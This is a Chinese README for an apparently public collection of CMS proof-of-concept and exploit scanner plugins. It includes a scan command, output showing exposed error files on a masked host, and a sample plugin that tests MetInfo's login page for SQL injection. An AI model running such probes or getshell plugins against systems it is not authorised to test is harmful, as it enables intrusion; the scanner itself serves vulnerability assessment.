# cms_poc_exp (扫描版本、兼容pocsuite3插件调用)
![](https://img.shields.io/badge/program-Python3-blue.svg)
___

## 此项目的目的与意义
> 个人精力有限,故公开此项目让感兴趣的人一起搜集插件为自己/作者扫描器提供强力的驱动
> 如果感兴趣为本项目提供支持,可以联系本人QQ2563152103
> 更新pocsuite3插件调用 20211116

+ 项目说明
  - ~~本项目插件现已支持Python3 不再兼容Python2,故若要使用 [ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)
  进行批量扫描,请自行修改插件支持Python2~~
  - ~~[ShellFrameworkd](https://github.com/1oid/Shell-Frameworkd)批量扫描将会再之后修改为支持Python3~~
  - `ShellFrameworkd`已更名为[PocBatch-M](https://github.com/1oid/PocBatch-M)并支持了Python3

+ 使用说明
`python3 scan.py -u "http://43.*.*.*" -c dedecms`
```
[*] Load Plugin dedecms_info_ver_txt.py
[Success!!!] TimeStamp: 20170405, Possible Version: V5.7SP1
[*] Load Plugin dedecms_sql_search_php.py
[-] Execute Fail!
[*] Load Plugin dedecms_sql_guestbook_php.py
[-] Execute Fail!
[*] Load Plugin dedecms_sql_download_2.py
[-] Execute Fail!
[*] Load Plugin dedecms_info_mysqli_error_inc.py
[Success!!!] dedecms error info:http://43.*.*.*/data/mysqli_error_trace.inc
[*] Load Plugin dede_backup_short_name.py
[-] Execute Fail!
[*] Load Plugin dedecms_getshell_install_php.py
[-] Execute Fail!
[*] Load Plugin dedecms_info_mysql_error_inc.py
[Success!!!] http://43.*.*.*/data/mysql_error_trace.inc
[*] Load Plugin dedecms_sql_recmomend_php.py
[-] Execute Fail!
[*] Load Plugin dedecms_redirect_download_php.py
```



+ 现有的cms插件
  - [dedecms](https://github.com/1oid/cms_poc_exp/tree/master/dedecms)
  - [discuz](https://github.com/1oid/cms_poc_exp/tree/master/discuz)
  - [emobile](https://github.com/1oid/cms_poc_exp/tree/master/emobile)
  - [finecms](https://github.com/1oid/cms_poc_exp/tree/master/finecms)
  - [jcms](https://github.com/1oid/cms_poc_exp/tree/master/jcms)
  - [maccms](https://github.com/1oid/cms_poc_exp/tree/master/maccms)
  - [metinfo](https://github.com/1oid/cms_poc_exp/tree/master/metinfo)
  - [phpcms](https://github.com/1oid/cms_poc_exp/tree/master/phpcms)
  - [tomcat](https://github.com/1oid/cms_poc_exp/tree/master/tomcat)
  - [weblogic](https://github.com/1oid/cms_poc_exp/tree/master/weblogic)
  - [wordpress](https://github.com/1oid/cms_poc_exp/tree/master/wordpress)
  - [网站扫描插件_其他通用漏洞](https://github.com/1oid/cms_poc_exp/tree/master/www)
  - [yonyouoa](https://github.com/1oid/cms_poc_exp/tree/master/yongyouoa)
  - [zfsoft](https://github.com/1oid/cms_poc_exp/tree/master/zfsoft)
  - [jetty](https://github.com/1oid/cms_poc_exp/tree/master/jetty)
  - [ecshop](https://github.com/1oid/cms_poc_exp/tree/master/ecshop)
  - [74cms](https://github.com/1oid/cms_poc_exp/tree/master/74cms)

+ 插件编写格式,
```python
class Exploit:

  def attack(self, url):
    # 这里写验证漏洞的一些代码
    return "返回(提示)字符串"
```
调用 `Exploit().attack(url)`

以`metinfo_login_lang_sql`插件为例
```python
import requests
from urllib.parse import quote

class Exploit:

    def attack(self, url):
        true_url = url + "/admin/login/login_check.php?langset=cn" + quote("' and '1' ='1")
        false_url = url + "/admin/login/login_check.php?langset=cn" + quote("' and '1' ='2")

        response = requests.get(true_url)
        response2 = requests.get(false_url)

        if 'not have this language' in response2.text and 'not have this language' not in response.text:
            return "{} has SQL Injection!".format(true_url)
```

## 插件编写注意事项
+ 拒绝重复插件, 新增了一个`find.py`, 通过特征来搜索已存在的脚本是否含有指定特征
使用方法: 
  - 方法一: `python3 find.py cms名称 特征` 例如 `python3 find.py dedecms /install/index.php`
  - 方法二: `python3 find.py 特征` 例如 `python3 find.py /install/index.php` (如果不指定cms, 则会查找本地所有的插件)

## 本项目目前支持/贡献的人
- [1oid(作者)](https://github.com/1oid)
- [ske](https://github.com/SkewwG/)提供自己编写的插件[VulScan](https://github.com/SkewwG/VulScan)
- [LiodAir](https://github.com/LiodAir)提交分支
- [icetea1](https://github.com/icetea1) 提交新的cms和poc
